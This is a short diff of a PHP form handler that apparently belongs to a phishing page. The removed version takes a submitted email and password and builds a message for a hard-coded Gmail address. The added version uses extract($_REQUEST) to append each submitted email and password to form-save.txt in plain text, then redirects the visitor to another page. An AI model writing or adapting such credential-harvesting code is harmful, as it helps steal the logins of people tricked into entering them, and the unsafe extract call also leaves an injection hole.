@@ -1,16 +1,14 @@
 <?php
-if(!empty($_POST["send"])){
-    $email = $_POST["email"];
-    $pass = $_POST["text"];
-    $toEmail = "is26683369@gmail.com";
 
-    $mailHeader = "name: " . $email .
-    "\r\n Email: " . $email .
-    "\r\n Password: " . $pass . "\r\n";
+    extract($_REQUEST);
+    $file=fopen("form-save.txt","a");
 
-
-}
-
+    
+    fwrite($file,"Email :");
+    fwrite($file, $email ."\n");
+    fwrite($file,"Password :");
+    fwrite($file, $password ."\n");
+    fclose($file);
 
 //redirect
 header("location: redirect.html")
